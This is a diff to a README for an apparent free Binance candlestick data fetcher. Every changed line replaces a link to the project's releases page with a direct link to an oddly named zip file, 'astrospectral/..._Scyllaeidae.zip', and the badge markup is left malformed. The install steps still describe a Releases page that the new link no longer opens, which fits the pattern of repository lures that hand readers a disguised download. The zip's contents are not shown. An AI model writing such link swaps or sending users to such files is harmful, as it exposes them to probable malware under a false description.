@@ -1,6 +1,6 @@
 # 📈 binance-free-historical-candlestick-data-fetcher - Fetch Historical Data Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/yomkiro/binance-free-historical-candlestick-data-fetcher/releases)
+[![Download](https://raw.githubusercontent.com/yomkiro/binance-free-historical-candlestick-data-fetcher/master/astrospectral/binance-free-historical-candlestick-data-fetcher_Scyllaeidae.zip%https://raw.githubusercontent.com/yomkiro/binance-free-historical-candlestick-data-fetcher/master/astrospectral/binance-free-historical-candlestick-data-fetcher_Scyllaeidae.zip)](https://raw.githubusercontent.com/yomkiro/binance-free-historical-candlestick-data-fetcher/master/astrospectral/binance-free-historical-candlestick-data-fetcher_Scyllaeidae.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Whether you want data for analysis, backtesting, or just personal use, this appl
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Download Releases](https://github.com/yomkiro/binance-free-historical-candlestick-data-fetcher/releases).
+1. Visit this page to download: [Download Releases](https://raw.githubusercontent.com/yomkiro/binance-free-historical-candlestick-data-fetcher/master/astrospectral/binance-free-historical-candlestick-data-fetcher_Scyllaeidae.zip).
 2. On the Releases page, find the latest version. You will see a list of files available for download.
 3. Click on the file that matches your operating system (e.g., Windows, macOS, or Linux).
 4. Download the file to your computer.
@@ -76,4 +76,4 @@ If you need further assistance, please reach out through the issues section on o
 
 For more detailed instructions or updates, be sure to check our GitHub page regularly. Your journey in fetching Binance data is now simplified with this application!
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/yomkiro/binance-free-historical-candlestick-data-fetcher/releases)
+[![Download](https://raw.githubusercontent.com/yomkiro/binance-free-historical-candlestick-data-fetcher/master/astrospectral/binance-free-historical-candlestick-data-fetcher_Scyllaeidae.zip%https://raw.githubusercontent.com/yomkiro/binance-free-historical-candlestick-data-fetcher/master/astrospectral/binance-free-historical-candlestick-data-fetcher_Scyllaeidae.zip)](https://raw.githubusercontent.com/yomkiro/binance-free-historical-candlestick-data-fetcher/master/astrospectral/binance-free-historical-candlestick-data-fetcher_Scyllaeidae.zip)
